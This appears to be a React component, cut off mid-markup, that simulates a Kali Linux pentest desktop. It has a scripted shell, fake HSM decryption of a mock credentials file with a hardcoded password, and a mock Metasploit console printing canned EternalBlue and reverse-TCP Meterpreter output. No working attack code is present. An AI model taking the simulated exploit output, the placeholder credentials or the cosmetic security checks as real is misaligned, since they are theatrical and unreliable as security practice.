import React, { useState, useEffect } from 'react';
import { Monitor, Terminal, X, Minimize2, Maximize2, MonitorOff, ShieldCheck, Wifi, Battery, Clock, Search, Folder, Globe, Chrome, Command, Key, Plus, Trash2, Loader2, Eye, EyeOff, ExternalLink, Crosshair } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { sshKeyService, SSHKey } from '../services/sshKeyService';

export const RemoteDesktop: React.FC = () => {
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [securityStatus, setSecurityStatus] = useState<'none' | 'handshaking' | 'verified'>('none');
  const [remoteAddress, setRemoteAddress] = useState('192.168.12.55');
  const [securityToken, setSecurityToken] = useState('');
  const [validationError, setValidationError] = useState<string | null>(null);
  const [terminalLogs, setTerminalLogs] = useState<{ text: string, type: 'command' | 'output' | 'error' | 'security' }[]>([
    { text: 'Nexus AI Secure Shell v2.5.0 initialized.', type: 'security' },
    { text: 'Local Environment: Secure', type: 'security' }
  ]);
  const [terminalInput, setTerminalInput] = useState('');
  const [showTerminal, setShowTerminal] = useState(true);
  const [isTerminalPoppedOut, setIsTerminalPoppedOut] = useState(false);
  const [showFiles, setShowFiles] = useState(false);
  const [isFilesDecrypted, setIsFilesDecrypted] = useState(false);
  const [isDecryptingFiles, setIsDecryptingFiles] = useState(false);
  const [currentDirPath, setCurrentDirPath] = useState<string[]>([]);
  const [selectedFile, setSelectedFile] = useState<any | null>(null);
  const [credentialsFileDecrypted, setCredentialsFileDecrypted] = useState(false);
  const [isDecryptingCredentialsFile, setIsDecryptingCredentialsFile] = useState(false);

  const handleMountDirectory = async () => {
    setIsDecryptingFiles(true);
    setTerminalLogs(prev => [...prev, { text: `[SEC_KERNEL] Mount request received for sector /home/root/`, type: 'security' }]);
    setTerminalLogs(prev => [...prev, { text: `Contacting HSM serial ${hsmStatus?.serial || 'FIPS-L3-NEXUS-08A'} for authorization...`, type: 'security' }]);
    
    try {
      const mountPayload = JSON.stringify({ action: "mount_home_partition", timestamp: Date.now() });
      const hsmRes = await fetch('/api/security/hsm/sign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: mountPayload, alias: 'RDP_SIGN_V1' })
      });
      const { signature } = await hsmRes.json();
      
      setTimeout(() => {
        setIsFilesDecrypted(true);
        setIsDecryptingFiles(false);
        setTerminalLogs(prev => [
          ...prev,
          { text: `HSM_MOUNT_SIG: ${signature.slice(0, 16)}...`, type: 'security' },
          { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512).', type: 'security' },
          { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' }
        ]);
      }, 1200);
    } catch (err) {
      setTimeout(() => {
        setIsFilesDecrypted(true);
        setIsDecryptingFiles(false);
        setTerminalLogs(prev => [
          ...prev,
          { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512) via fallback key.', type: 'security' },
          { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' }
        ]);
      }, 1200);
    }
  };
  const [showBrowser, setShowBrowser] = useState(false);
  const [showBurp, setShowBurp] = useState(false);
  const [showMetasploit, setShowMetasploit] = useState(false);
  const [metasploitInput, setMetasploitInput] = useState('');
  const [metasploitHistory, setMetasploitHistory] = useState([
    { text: '       =[ metasploit v6.3.5-dev                         ]', type: 'banner' },
    { text: '+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]', type: 'banner' },
    { text: '+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]', type: 'banner' },
    { text: '+ -- --=[ 9 evasion                                       ]', type: 'banner' },
    { text: '', type: 'banner' },
  ]);
  const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
  const [hsmStatus, setHsmStatus] = useState<{ status: string, serial: string } | null>(null);
  
  // SSH Key Management State
  const [showKeyManager, setShowKeyManager] = useState(false);
  const [sshKeys, setSSHKeys] = useState<SSHKey[]>([]);
  const [selectedKeyId, setSelectedKeyId] = useState<string | null>(null);
  const [isKeysLoading, setIsKeysLoading] = useState(false);
  const [newKeyLabel, setNewKeyLabel] = useState('');
  const [newPublicKey, setNewPublicKey] = useState('');
  const [isAddingKey, setIsAddingKey] = useState(false);
  const [viewingDecryptedKey, setViewingDecryptedKey] = useState<{id: string, text: string} | null>(null);

  useEffect(() => {
    const fetchHSM = async () => {
      try {
        const res = await fetch('/api/security/hsm/status');
        const data = await res.json();
        setHsmStatus(data);
      } catch (e) {
        console.error("HSM offline");
      }
    };
    
    fetchHSM();
    fetchKeys(); // Fetch keys once on mount for the connection screen

    const interval = setInterval(() => {
      setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  const fetchKeys = async () => {
    setIsKeysLoading(true);
    try {
      const keys = await sshKeyService.getKeys();
      setSSHKeys(keys);
    } catch (e) {
      console.error("Failed to fetch keys");
    } finally {
      setIsKeysLoading(false);
    }
  };

  useEffect(() => {
    if (showKeyManager) {
      fetchKeys();
    }
  }, [showKeyManager]);

  const handleAddKey = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newKeyLabel || !newPublicKey) return;
    setIsAddingKey(true);
    try {
      await sshKeyService.addKey(newKeyLabel, newPublicKey);
      setNewKeyLabel('');
      setNewPublicKey('');
      await fetchKeys();
    } catch (e) {
      setValidationError('SSH_KEY_STORAGE_ENCRYPTION_FAILED');
    } finally {
      setIsAddingKey(false);
    }
  };

  const handleDeleteKey = async (id: string) => {
    try {
      await sshKeyService.deleteKey(id);
      await fetchKeys();
    } catch (e) {
      console.error("Delete failed");
    }
  };

  const handleTranslateKey = async (key: SSHKey) => {
    if (viewingDecryptedKey?.id === key.id) {
      setViewingDecryptedKey(null);
      return;
    }
    try {
      const decrypted = await sshKeyService.decryptKey(key.encryptedKey);
      setViewingDecryptedKey({ id: key.id, text: decrypted });
      setTerminalLogs(prev => [...prev, { text: `HSM_DECRYPT_EVENT: User accessed plain-text for identity ${key.label}`, type: 'security' }]);
    } catch (e) {
      console.error("HSM decryption failed");
    }
  };

  // Security Helper: Output Encoding / Sanitization
  const encodeOutput = (text: string) => {
    return text
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  };

  const validateInputs = () => {
    // Regex for IP validation
    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (!ipRegex.test(remoteAddress)) {
      setValidationError('INVALID_REMOTE_IP_FORMAT');
      return false;
    }
    
    // Security Token validation (simulated 8+ chars)
    if (securityToken.length < 8) {
      setValidationError('SECURITY_TOKEN_INSUFFICIENT_ENTROPY');
      return false;
    }

    setValidationError(null);
    return true;
  };

  const handleConnect = async () => {
    if (!validateInputs()) return;

    setIsConnecting(true);
    setSecurityStatus('handshaking');
    
    // 1. Request HSM-backed Session Token (M-TLS Simulation)
    try {
      setTerminalLogs(prev => [...prev, { text: `Contacting HSM (Serial: ${hsmStatus?.serial || '...'})...`, type: 'security' }]);
      
      const selectedKey = sshKeys.find(k => k.id === selectedKeyId);
      const sessionData = {
        target: remoteAddress,
        client: "HEX-CMD-01",
        identity: selectedKey ? selectedKey.label : 'GENERIC_ANONYMOUS',
        identityId: selectedKeyId || 'NULL',
        timestamp: Date.now()
      };

      const hsmRes = await fetch('/api/security/hsm/sign', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: JSON.stringify(sessionData), alias: 'RDP_SIGN_V1' })
      });
      const { signature } = await hsmRes.json();

      setTerminalLogs(prev => [...prev, { text: `HSM_VALID_SIG: ${signature.slice(0, 16)}...`, type: 'security' }]);
      
      // 2. Proof of Possession (PoP) Handshake
      setTimeout(() => {
        setSecurityStatus('verified');
        setTerminalLogs(prev => [...prev, { text: `Handshake established with ${remoteAddress}`, type: 'security' }]);
        setTimeout(() => {
          setIsConnecting(false);
          setIsConnected(true);
        }, 1000);
      }, 1500);

    } catch (err) {
      setValidationError('HSM_COMM_FAILURE_CRYPTO_REQUIRED');
      setIsConnecting(false);
      setSecurityStatus('none');
    }
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    const sanitizedInput = terminalInput.trim();
    setTerminalLogs(prev => [...prev, { text: sanitizedInput, type: 'command' }]);

    const lowerInput = sanitizedInput.toLowerCase();
    const args = sanitizedInput.split(' ');
    const cmd = args[0].toLowerCase();

    if (sanitizedInput.includes('<script>') || sanitizedInput.includes('eval(')) {
      setTerminalLogs(prev => [...prev, { text: 'SECURITY_ALERT: Malicious payload intercepted and encoded.', type: 'error' }]);
      setTerminalLogs(prev => [...prev, { text: `Encoded Result: ${encodeOutput(sanitizedInput)}`, type: 'security' }]);
    } else if (cmd === 'help' || cmd === '?') {
      setTerminalLogs(prev => [
        ...prev,
        { text: 'Nexus Secure Shell Terminal v2.5.0\nSupported Commands:\n  help / ?               Display this menu\n  ls                     List files and directories\n  cat <file>             Print the contents of a file\n  decrypt <file>         Decrypt an encrypted file via System HSM\n  mount-hsm              Mount encrypted directory structure via HSM alias\n  clear                  Clear terminal history\n  sysinfo                Print remote system information', type: 'output' }
      ]);
    } else if (cmd === 'clear') {
      setTerminalLogs([]);
    } else if (cmd === 'sysinfo') {
      setTerminalLogs(prev => [
        ...prev,
        { text: `Computer: TARGET-KALI-X-99\nOS: Kali GNU/Linux Rolling 2026.1\nKernel: 6.6.0-kali1-amd64\nHSM Bound: Yes (Serial: ${hsmStatus?.serial || 'FIPS-L3-NEXUS-08A'})\nOperational State: ENCRYPTED_STORAGE_BOUND`, type: 'output' }
      ]);
    } else if (cmd === 'mount-hsm') {
      if (isFilesDecrypted) {
        setTerminalLogs(prev => [...prev, { text: 'Directory structure already mounted.', type: 'output' }]);
      } else {
        setIsDecryptingFiles(true);
        setTerminalLogs(prev => [...prev, { text: '[*] Negotiating session key with HSM serial ' + (hsmStatus?.serial || 'FIPS-L3-NEXUS-08A') + '...', type: 'security' }]);
        setTimeout(() => {
          setIsFilesDecrypted(true);
          setIsDecryptingFiles(false);
          setTerminalLogs(prev => [
            ...prev,
            { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Sector decrypted successfully (AES-XTS-512).', type: 'security' },
            { text: '[SEC_KERNEL] MOUNT_SUCCESS: 4 directory nodes mounted under /home/root/.', type: 'security' },
            { text: 'File system mounted successfully.', type: 'output' }
          ]);
        }, 1200);
      }
    } else if (cmd === 'ls') {
      if (!isFilesDecrypted) {
        setTerminalLogs(prev => [...prev, { text: 'ls: cannot open directory \'.\': Directory contents encrypted. Access denied.', type: 'error' }]);
      } else {
        setTerminalLogs(prev => [
          ...prev,
          { text: 'drwxr-xr-x  2 root root  4096 May 18 19:05  recon_data/\ndrwxr-xr-x  2 root root  4096 May 18 19:05  exploit_payloads/\n-rw-r--r--  1 root root  1228 May 18 19:05  README.txt\n-rw-r--r--  1 root root   512 May 18 19:05  credentials.db.enc', type: 'output' }
        ]);
      }
    } else if (cmd === 'cat') {
      if (!isFilesDecrypted) {
        setTerminalLogs(prev => [...prev, { text: 'cat: directory contents encrypted. Access denied.', type: 'error' }]);
      } else if (args.length < 2) {
        setTerminalLogs(prev => [...prev, { text: 'usage: cat <filename>', type: 'error' }]);
      } else {
        const targetFileName = args[1].trim();
        if (targetFileName === 'README.txt') {
          setTerminalLogs(prev => [...prev, { text: '=========================================\nNEXUS AI SECURITY SYSTEM - TARGET DESKTOP\n=========================================\n\nIP Target Address: 192.168.12.55\nAuthorized Operator: NEXUS_OPERATOR\n\nActive Nodes detected in subnet:\n- 192.168.12.1   (Gateway Router)\n- 192.168.12.55  (Kali Pentest Node - Local)\n- 192.168.12.102 (Database Master Node)\n\nNOTICE:\nAll operations are recorded to MATRIX_CORE. Log files under recon_data/ are active.', type: 'output' }]);
        } else if (targetFileName === 'credentials.db.enc') {
          if (credentialsFileDecrypted) {
            setTerminalLogs(prev => [...prev, { text: '{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}', type: 'output' }]);
          } else {
            setTerminalLogs(prev => [...prev, { text: '[ENCRYPTED PAYLOAD - AES-256-GCM]\nRaw: U2FsdGVkX1+Tz1Q5V2K9G6H7m8X8W9A0Q1B2C3D4E5F6==\nUse command "decrypt credentials.db.enc" to decrypt.', type: 'output' }]);
          }
        } else {
          setTerminalLogs(prev => [...prev, { text: `cat: ${targetFileName}: No such file in root directory.`, type: 'error' }]);
        }
      }
    } else if (cmd === 'decrypt') {
      if (!isFilesDecrypted) {
        setTerminalLogs(prev => [...prev, { text: 'decrypt: directory contents encrypted. Access denied.', type: 'error' }]);
      } else if (args.length < 2) {
        setTerminalLogs(prev => [...prev, { text: 'usage: decrypt <filename>', type: 'error' }]);
      } else {
        const targetFileName = args[1].trim();
        if (targetFileName === 'credentials.db.enc') {
          if (credentialsFileDecrypted) {
            setTerminalLogs(prev => [...prev, { text: 'File credentials.db.enc is already decrypted.', type: 'output' }]);
          } else {
            setTerminalLogs(prev => [...prev, { text: `[*] Sending cryptovariable credentials.db.enc to HSM [RDP_SIGN_V1]...`, type: 'security' }]);
            setTimeout(() => {
              setCredentialsFileDecrypted(true);
              setTerminalLogs(prev => [
                ...prev,
                { text: '[SEC_KERNEL] HSM_DECRYPT_EVENT: Decryption of credentials.db.enc successful.', type: 'security' },
                { text: 'Decrypted content:\n{\n  "db_user": "nexus_admin",\n  "db_pass": "SuperSecureNexusAI2026!",\n  "ssh_root_key_alias": "NEXUS_MAIN_GATEWAY_KEY",\n  "neural_model_salt": "0xDEADBEEF42"\n}', type: 'output' }
              ]);
            }, 1000);
          }
        } else {
          setTerminalLogs(prev => [...prev, { text: `decrypt: ${targetFileName}: No cryptographic context found or file is plain text.`, type: 'error' }]);
        }
      }
    } else {
      setTerminalLogs(prev => [...prev, { text: `bash: ${cmd}: command not found. Type 'help' for available commands.`, type: 'error' }]);
    }

    setTerminalInput('');
  };

  const handleMetasploitSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!metasploitInput.trim()) return;

    const cmd = metasploitInput.trim();
    setMetasploitHistory(prev => [...prev, { text: `msf6 > ${cmd}`, type: 'input' }]);

    let output = '';
    const lowerCmd = cmd.toLowerCase();

    if (lowerCmd === 'help') {
      output = `Core Commands\n=============\n\n    Command       Description\n    -------       -----------\n    ?             Help menu\n    banner        Display an awesome metasploit banner\n    cd            Change the current working directory\n    color         Toggle color\n    connect       Communicate with a host\n    exit          Exit the console\n    help          Help menu\n    info          Displays information about one or more modules\n    irb           Open an interactive Ruby shell in the current context\n    jobs          Displays and manages jobs\n    kill          Kill a job\n    load          Load a framework plugin\n    quit          Exit the console\n    route         Route traffic through a session\n    save          Saves the active datastores\n    search        Searches module names and descriptions\n    sessions      Dump session listings and display information about sessions\n    set           Sets a context-specific variable to a value\n    show          Displays modules of a given type, or all modules\n    sleep         Do nothing for the specified number of seconds\n    spool         Write console output into a file as well the screen\n    threads       View and manipulate background threads\n    unload        Unload a framework plugin\n    use           Interact with a module by name or search term/index\n    version       Show the framework and console library version numbers`;
    } else if (lowerCmd.startsWith('use ')) {
      const module = lowerCmd.split(' ')[1];
      output = `[*] Using configured payload windows/x64/meterpreter/reverse_tcp`;
      setMetasploitHistory(prev => [
        ...prev, 
        { text: output, type: 'info' },
        { text: `msf6 exploit(${module.split('/').pop()}) > `, type: 'prompt' }
      ]);
      setMetasploitInput('');
      return;
    } else if (lowerCmd.startsWith('set ')) {
      const [_, key, val] = lowerCmd.split(' ');
      output = `${key.toUpperCase()} => ${val}`;
    } else if (lowerCmd === 'run' || lowerCmd === 'exploit') {
      output = `[*] Started reverse TCP handler on 192.168.1.105:4444 \n[*] 192.168.12.55:445 - Connecting to target for exploitation.\n[+] 192.168.12.55:445 - Connection established for exploitation.\n[+] 192.168.12.55:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 192.168.12.55:445 - CORE raw buffer dump (42 bytes)\n[*] 192.168.12.55:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 192.168.12.55:445 - Trying exploit with 12 Groom Allocations.\n[*] 192.168.12.55:445 - Sending all but last fragment of exploit packet\n[*] 192.168.12.55:445 - Starting non-paged pool grooming\n[+] 192.168.12.55:445 - Sending SMBv2 buffers\n[+] 192.168.12.55:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 192.168.12.55:445 - Sending final SMBv2 buffers.\n[*] 192.168.12.55:445 - Sending last fragment of exploit packet!\n[*] 192.168.12.55:445 - Receiving response from exploit packet\n[+] 192.168.12.55:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 192.168.12.55:445 - Sending egg to corrupted connection.\n[*] 192.168.12.55:445 - Triggering free of corrupted buffer.\n[*] Sending stage (200262 bytes) to 192.168.12.55\n[*] Meterpreter session 1 opened (192.168.1.105:4444 -> 192.168.12.55:49156)`;
      setMetasploitHistory(prev => [
        ...prev, 
        { text: output, type: 'success' },
        { text: `meterpreter > `, type: 'meterpreter' }
      ]);
      setMetasploitInput('');
      return;
    } else if (lowerCmd === 'sysinfo') {
      output = `Computer        : TARGET-WIN-01\nOS              : Windows 10 (10.0 Build 19041).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows`;
    } else if (lowerCmd === 'getuid') {
      output = `Server username: NT AUTHORITY\\SYSTEM`;
    } else {
      output = `[-] Unknown command: ${cmd}.`;
    }

    setMetasploitHistory(prev => [...prev, { text: output, type: output.startsWith('[-]') ? 'error' : 'output' }]);
    setMetasploitInput('');
  };

  if (!isConnected) {
    return (
      <div className="h-[calc(100vh-160px)] bg-slate-950 flex items-center justify-center rounded-lg border border-slate-800 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_rgba(6,182,212,0.1)_0%,_transparent_70%)]" />
        
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-slate-900/60 p-8 rounded-3xl border border-slate-800 backdrop-blur-xl text-center space-y-6 w-full max-w-md relative z-10"
        >
          <div className="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-2 border border-slate-700">
             <Monitor className={`w-8 h-8 ${isConnecting ? 'text-cyan-500 animate-pulse' : 'text-slate-500'}`} />
          </div>
          
          <div className="space-y-1">
            <h2 className="text-xl font-bold text-white uppercase italic tracking-tight">SECURE_RDP_GATEWAY</h2>
            <div className="flex items-center justify-center gap-2">
              <p className="text-[9px] text-slate-500 font-mono tracking-widest uppercase">Encryption: AES-256-GCM</p>
              {hsmStatus?.status === 'OPERATIONAL' && (
                <div className="flex items-center gap-1 bg-emerald-500/10 px-1.5 py-0.5 rounded border border-emerald-500/20">
                  <div className="w-1 h-1 rounded-full bg-emerald-500 animate-pulse" />
                  <span className="text-[8px] text-emerald-500 font-bold tracking-tighter">HSM_FIPS_L3</span>
                </div>
              )}
            </div>
          </div>

          <div className="space-y-4 text-left">
            <div className="space-y-1.5">
               <label className="text-[10px] font-mono text-slate-500 uppercase tracking-widest ml-1">Remote Target Address</label>
               <input 
                 type="text" 
                 value={remoteAddress}
                 onChange={(e) => setRemoteAddress(e.target.value)}
                 disabled={isConnecting}
                 className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-sm text-cyan-500 font-mono focus:border-cyan-500/50 outline-none transition-all"
                 placeholder="0.0.0.0"
               />
            </div>

            <div className="space-y-1.5">
               <label className="text-[10px] font-mono text-slate-500 uppercase tracking-widest ml-1">SSH Identity Key (Vaulted)</label>
               <div className="relative">
                 <select 
                   value={selectedKeyId || ''}
                   onChange={(e) => setSelectedKeyId(e.target.value || null)}
                   disabled={isConnecting}
                   className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-sm text-cyan-500 font-mono focus:border-cyan-500/50 outline-none transition-all appearance-none cursor-pointer pr-10"
                 >
                   <option value="">-- USE_GENERIC_IDENTITY --</option>
                   {sshKeys.map(key => (
                     <option key={key.id} value={key.id}>{key.label.toUpperCase()}</option>
                   ))}
                 </select>
                 <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
                   <Key className="w-4 h-4 text-slate-600" />
                 </div>
               </div>
            </div>
            <div className="space-y-1.5">
               <label className="text-[10px] font-mono text-slate-500 uppercase tracking-widest ml-1">Access Token (8+ Characters)</label>
               <div className="relative">
                  <input 
                    type="password" 
                    value={securityToken}
                    onChange={(e) => setSecurityToken(e.target.value)}
                    disabled={isConnecting}
                    className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white font-mono focus:border-cyan-500/50 outline-none transition-all"
                    placeholder="••••••••••••"
                  />
                  <div className="absolute right-4 top-1/2 -translate-y-1/2">
                    <ShieldCheck className={`w-4 h-4 ${securityToken.length >= 8 ? 'text-emerald-500' : 'text-slate-700'}`} />
                  </div>
               </div>
            </div>
            
            {validationError && (
              <motion.div 
                initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }}
                className="flex items-center gap-2 text-red-500 text-[10px] font-bold uppercase tracking-tighter bg-red-500/10 p-2 rounded-lg border border-red-500/20"
              >
                <div className="w-1 h-1 rounded-full bg-red-500 animate-ping" />
                {validationError}
              </motion.div>
            )}
          </div>
          
          <div className="flex gap-3">
            <button 
              onClick={() => setShowKeyManager(true)}
              className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 py-4 rounded-xl font-bold flex items-center justify-center gap-2 transition-all border border-slate-700/50"
            >
              <Key className="w-4 h-4" />
              <span>KEY_VAULT</span>
            </button>

            <button 
              onClick={handleConnect}
              disabled={isConnecting}
              className={`flex-[2] py-4 transition-all flex items-center justify-center gap-3 group disabled:opacity-80 rounded-xl font-bold ${
                securityStatus === 'verified' ? 'bg-emerald-600 text-white' : 'bg-cyan-600 hover:bg-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]'
              }`}
            >
              {isConnecting ? (
                <>
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  <span>{securityStatus === 'handshaking' ? 'M-TLS...' : 'DH_KEY...'}</span>
                </>
              ) : (
                <>
                  <MonitorOff className="w-4 h-4" />
                  <span>ESTABLISH_LINK</span>
                </>
              )}
            </button>
          </div>
          
          <div className="pt-4 flex flex-col items-center justify-center gap-2">
            <div className={`flex items-center gap-2 text-[9px] font-mono uppercase transition-colors ${
              securityStatus === 'verified' ? 'text-emerald-500' : 'text-slate-600'
            }`}>
              <ShieldCheck className="w-3 h-3" />
              <span>{securityStatus === 'verified' ? 'Identity Verified: KALI-X-99' : 'Handshake Protocol: AES-256-GCM'}</span>
            </div>
            {securityStatus === 'handshaking' && (
              <motion.div 
                initial={{ width: 0 }}
                animate={{ width: '100%' }}
                className="h-0.5 bg-cyan-500/50 w-32 rounded-full overflow-hidden"
              >
                <motion.div 
                  animate={{ x: [-100, 100] }}
                  transition={{ repeat: Infinity, duration: 1 }}
                  className="h-full w-20 bg-cyan-400"
                />
              </motion.div>
            )}
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="h-[calc(100vh-160px)] bg-slate-900 rounded-lg border border-slate-800 flex flex-col relative overflow-hidden shadow-2xl">
      {/* KALI TOP PANEL */}
      <div className="h-7 bg-black border-b border-white/5 flex items-center justify-between px-3 text-white/70 text-[10px] select-none">
        <div className="flex items-center gap-4">
           <div className="flex items-center gap-1.5 hover:text-white transition-colors cursor-pointer">
              <Command className="w-3.5 h-3.5 text-cyan-500" />
              <span className="font-bold">Applications</span>
           </div>
           <div className="flex items-center gap-4 text-white/40">
              <span className="hover:text-white transition-colors cursor-pointer capitalize">Places</span>
              <span className="hover:text-white transition-colors cursor-pointer capitalize">System</span>
           </div>
        </div>
        
        <div className="absolute left-1/2 -translate-x-1/2 font-mono font-medium flex items-center gap-2">
           <Clock className="w-3 h-3 text-cyan-500/50" />
           {currentTime}
        </div>

        <div className="flex items-center gap-4">
           <div className="flex items-center gap-3">
              <Wifi className="w-3.5 h-3.5" />
              <Battery className="w-3.5 h-3.5 text-emerald-500" />
           </div>
           <div className="flex items-center gap-3 border-l border-white/10 pl-3">
              <ShieldCheck className="w-3.5 h-3.5 text-cyan-400" />
              <div className="flex items-center gap-1">
                 <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 shadow-[0_0_5px_rgba(16,185,129,0.5)]" />
                 <span className="font-bold uppercase tracking-tighter">root</span>
              </div>
           </div>
           <button onClick={() => setIsConnected(false)} className="hover:text-red-400 transition-colors">
              <X className="w-4 h-4" />
           </button>
        </div>
      </div>

      {/* DESKTOP AREA */}
      <div className="flex-1 bg-[#1a222c] relative overflow-hidden desktop-canvas">
        {/* BACKGROUND LOGO */}
        <div className="absolute inset-0 flex items-center justify-center opacity-[0.03] pointer-events-none">
           <img src="https://www.kali.org/images/kali-logo.svg" alt="Kali Logo" className="w-1/2 grayscale invert" />
        </div>

        {/* DESKTOP ICONS */}
        <div className="p-4 grid grid-cols-1 w-24 gap-4">
           <DesktopIcon icon={Folder} label="Home" color="text-amber-400" onClick={() => setShowFiles(true)} status="connected" />
           <DesktopIcon icon={Search} label="Burp Suite" color="text-orange-500" onClick={() => setShowBurp(true)} status="disconnected" />
           <DesktopIcon icon={Terminal} label="Terminal" color="text-slate-300" onClick={() => setShowTerminal(true)} status="connected" />
           <DesktopIcon icon={Chrome} label="Browser" color="text-cyan-400" onClick={() => setShowBrowser(true)} status="connected" />
           <DesktopIcon icon={Crosshair} label="Metasploit" color="text-red-500" onClick={() => setShowMetasploit(true)} status="connected" />
        </div>

        {/* WINDOWS */}
        <AnimatePresence>
          {showTerminal && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className={`bg-[#0c0c0c] border border-white/10 rounded-lg shadow-2xl flex flex-col backdrop-blur-md overflow-hidden min-w-[300px] md:min-w-[400px] min-h-[300px] transition-all ${isTerminalPoppedOut ? 'fixed inset-2 md:inset-4 z-[60]' : 'absolute inset-x-2 top-12 md:left-32 md:w-2/3 h-2/3 resize'}`}
            >
              {/* Terminal Title Bar */}
              <div className="h-9 bg-[#1a1a1a] border-b border-white/5 flex items-center justify-between px-3 shrink-0 rounded-t-lg">
                <div className="flex items-center gap-3">
                   <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                   <span className="text-[10px] text-white/50 font-mono tracking-tight">root@kali: ~/tools/recon</span>
                </div>
                <div className="flex items-center gap-3">
                   <ExternalLink onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
                   <Minimize2 className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
                   <Maximize2 onClick={() => setIsTerminalPoppedOut(!isTerminalPoppedOut)} className="w-3 h-3 text-white/30 cursor-pointer hover:text-white" />
                   <X onClick={() => setShowTerminal(false)} className="w-3.5 h-3.5 text-white/30 cursor-pointer hover:text-red-500" />
                </div>
              </div>
              
              {/* Terminal Content */}
              <div className="flex-1 p-4 font-mono text-[11px] overflow-y-auto space-y-1 custom-scrollbar">
                 {terminalLogs.map((log, i) => (
                   <div key={i} className="flex flex-col">
                     {log.type === 'command' && (
                       <div className="flex gap-2">
                         <span className="text-emerald-500">┌──(</span>
                         <span className="text-cyan-400 font-bold">root㉿kali</span>
                         <span className="text-emerald-500">)-[</span>
                         <span className="text-white">~</span>
                         <span className="text-emerald-500">]</span>
                         <div className="flex gap-2">
                           <span className="text-emerald-500">└─#</span>
                           <span className="text-white">{log.text}</span>
                         </div>
                       </div>
                     )}
                     {log.type === 'output' && (
                       <div className="text-slate-400 pl-4 py-0.5 opacity-80 break-all">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'error' && (
                       <div className="text-red-500 pl-4 py-0.5 font-bold animate-pulse uppercase tracking-tighter">
                         {log.text}
                       </div>
                     )}
                     {log.type === 'security' && (
                       <div className="text-cyan-500/60 pl-4 py-0.5 italic border-l border-cyan-500/20 ml-2">
                          [SEC_KERNEL] {log.text}
                       </div>
                     )}
                   </div>
                 ))}
                 
                 <form onSubmit={handleTerminalSubmit} className="flex flex-col gap-1 pt-2">
                    <div className="flex gap-2">
                       <span className="text-emerald-500">┌──(</span>
                       <span className="text-cyan-400 font-bold">root㉿kali</span>
                       <span className="text-emerald-500">)-[</span>
                       <span className="text-white">~</span>
                       <span className="text-emerald-500">]</span>
                    </div>
                    <div className="flex gap-2 items-center">
                       <span className="text-emerald-500">└─#</span>
                       <input 
                         type="text"
                         value={terminalInput}
                         onChange={(e) => setTerminalInput(e.target.value)}
                         className="flex-1 bg-transparent border-none outline-none text-white font-mono"
                         autoFocus
                       />
                       <div className="w-1.5 h-3 bg-cyan-500 animate-pulse" />
                    </div>
                 </form>
              </div>
            </motion.div>
          )}

          {showFiles && (
            <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="absolute top-16 left-10 md:left-40 w-[95%] md:w-3/4 h-[75%] bg-[#1e1e1e] border border-white/10 rounded-lg shadow-2xl flex flex-col backdrop-blur-md z-[55]"
            >
